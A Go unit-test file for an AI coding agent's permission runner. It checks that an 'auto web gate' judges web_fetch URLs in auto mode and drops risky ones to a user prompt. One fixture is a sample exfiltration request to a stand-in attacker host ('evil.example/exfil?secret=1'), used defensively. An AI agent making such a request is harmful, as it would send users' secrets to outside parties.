package runner

import (
	"context"
	"strings"
	"testing"

	"nekocode/bot/extension/tool/runtime/core"
	"nekocode/bot/extension/tool/runtime/permission"
	"nekocode/protocol"
)

func TestAutoWebGateForcesPromptOnDangerousURL(t *testing.T) {
	e := NewExecutor(nil)
	var judged string
	e.SetWebAutoJudge(func(_ context.Context, url string) (dangerous bool, ok bool) {
		judged = url
		return true, true
	})
	e.SetPermissionMode(permission.ModeAuto)

	dec := e.applyAutoWebGate(context.Background(), permissionDecision{}, core.ToolCallItem{
		ID: "w1", Name: "web_fetch", Args: map[string]any{"url": "https://evil.example/exfil?secret=1"},
	})
	if !dec.prompt || judged != "https://evil.example/exfil?secret=1" {
		t.Fatalf("dangerous URL must drop to a prompt, dec=%+v judged=%q", dec, judged)
	}
	if dec.approval == nil || !strings.Contains(dec.approval.Reason, "URL judged risky") {
		t.Fatalf("gate prompt must carry the judge reason, approval=%+v", dec.approval)
	}
}

func TestAutoWebGateSurfacesSafeVerdict(t *testing.T) {
	e := NewExecutor(nil)
	var previews []string
	var decisions []protocol.ToolDecision
	e.SetPreviewDecisionFn(func(_ string, _ string, _ map[string]any, preview string, decision protocol.ToolDecision) {
		previews = append(previews, preview)
		decisions = append(decisions, decision)
	})
	e.SetWebAutoJudge(func(_ context.Context, url string) (dangerous bool, ok bool) {
		return false, true
	})
	e.SetPermissionMode(permission.ModeAuto)

	dec := e.applyAutoWebGate(context.Background(), permissionDecision{}, core.ToolCallItem{
		ID: "w1", Name: "web_fetch", Args: map[string]any{"url": "https://example.com", "_preview": "GET https://example.com"},
	})
	if dec.prompt || dec.block {
		t.Fatalf("safe URL must keep the allow, dec=%+v", dec)
	}
	if len(previews) != 1 || previews[0] != "GET https://example.com" || len(decisions) != 1 || decisions[0] != protocol.ToolDecisionJevURLSafe {
		t.Fatalf("safe verdict metadata missing: previews=%v decisions=%v", previews, decisions)
	}
}

func TestAutoWebGateKeepsAllowOnSafeOrUnavailableJudge(t *testing.T) {
	e := NewExecutor(nil)
	e.SetWebAutoJudge(func(_ context.Context, url string) (dangerous bool, ok bool) {
		return false, true
	})
	e.SetPermissionMode(permission.ModeAuto)

	dec := e.applyAutoWebGate(context.Background(), permissionDecision{}, core.ToolCallItem{
		ID: "w1", Name: "web_fetch", Args: map[string]any{"url": "https://example.com"},
	})
	if dec.prompt || dec.block {
		t.Fatalf("safe URL must keep the allow, dec=%+v", dec)
	}

	// Judge unavailable (ok=false) fails open to the rule's decision.
	e.SetWebAutoJudge(func(_ context.Context, url string) (dangerous bool, ok bool) {
		return true, false
	})
	dec = e.applyAutoWebGate(context.Background(), permissionDecision{}, core.ToolCallItem{
		ID: "w2", Name: "web_fetch", Args: map[string]any{"url": "https://example.com"},
	})
	if dec.prompt || dec.block {
		t.Fatalf("unavailable judge must keep the rule's decision, dec=%+v", dec)
	}
}

func TestAutoWebGateInactiveOutsideAutoMode(t *testing.T) {
	for _, mode := range []permission.Mode{permission.ModeManual, permission.ModeFull} {
		e := NewExecutor(nil)
		e.SetWebAutoJudge(func(_ context.Context, url string) (dangerous bool, ok bool) {
			return true, true
		})
		e.SetPermissionMode(mode)

		dec := e.applyAutoWebGate(context.Background(), permissionDecision{}, core.ToolCallItem{
			ID: "w1", Name: "web_fetch", Args: map[string]any{"url": "https://evil.example"},
		})
		if dec.prompt || dec.block {
			t.Fatalf("mode %d must not consult the web gate, dec=%+v", mode, dec)
		}
	}
}

func TestAutoWebGateIgnoresNonWebTools(t *testing.T) {
	e := NewExecutor(nil)
	var called bool
	e.SetWebAutoJudge(func(_ context.Context, url string) (dangerous bool, ok bool) {
		called = true
		return true, true
	})
	e.SetPermissionMode(permission.ModeAuto)

	dec := e.applyAutoWebGate(context.Background(), permissionDecision{}, core.ToolCallItem{
		ID: "s1", Name: "shell", Args: map[string]any{"url": "https://evil.example"},
	})
	if called || dec.prompt || dec.block {
		t.Fatalf("web gate must only apply to web tools, dec=%+v called=%v", dec, called)
	}
}
